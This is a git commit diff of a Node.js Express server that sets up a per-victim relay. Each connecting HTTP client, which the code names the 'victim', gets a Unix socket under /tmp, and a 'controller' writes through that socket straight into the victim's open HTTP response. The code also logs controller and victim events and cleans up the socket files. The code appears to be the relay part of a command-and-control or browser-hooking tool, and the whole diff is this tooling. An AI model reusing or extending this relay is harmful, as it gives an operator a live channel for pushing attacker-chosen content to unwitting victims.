e1a195057af94515c196a44c1110f272541f4782
Gianluca Venturini <gianluca.91@gmail.com>
2022-06-17 18:23:54 -0700

    Better server interface

--- server.js
+++ server.js
@@ -11,23 +11,42 @@ const options = {
 
 const app = express();
 
-app.listen(1337);
-
 app.get('/', (req, res) => {
-  // const fileName = req.socket.remoteAddress;
-  const fileName = '/tmp/test.sock';
+  const fileName = `/tmp/victim-${req.socket.remoteAddress.replace(/[.:]/g, '-')}.sock`;
   try {
-    fs.unlinkSync(fileName); // delete socket in case it's still there
+    // delete socket in case it's still there
+    fs.unlinkSync(fileName);
   } catch (e) { }
 
+  let controllerStream;
+
   var server = net.createServer(stream => {
+    controllerStream = stream;
     stream.on('data', c => {
-      console.log('data:', c.toString());
+      console.log('Controller -> Victim:', c.toString());
       res.write(c.toString());
     });
     stream.on('end', () => {
+      console.log('Controller ended the stream');
       server.close();
       res.end();
+      controllerStream = null;
+    });
+  });
+
+  req.on('close', () => {
+    const errorMsg = `Victim HTTP connection closed`;
+    console.log(errorMsg);
+    if (controllerStream) {
+      controllerStream.write(errorMsg);
+    }
+    server.close(function () {
+      console.log('Controller socket correctly closed');
+      server.unref();
+      try {
+        // Best effort delete socket
+        fs.unlinkSync(fileName);
+      } catch (e) { }
     });
   });
 
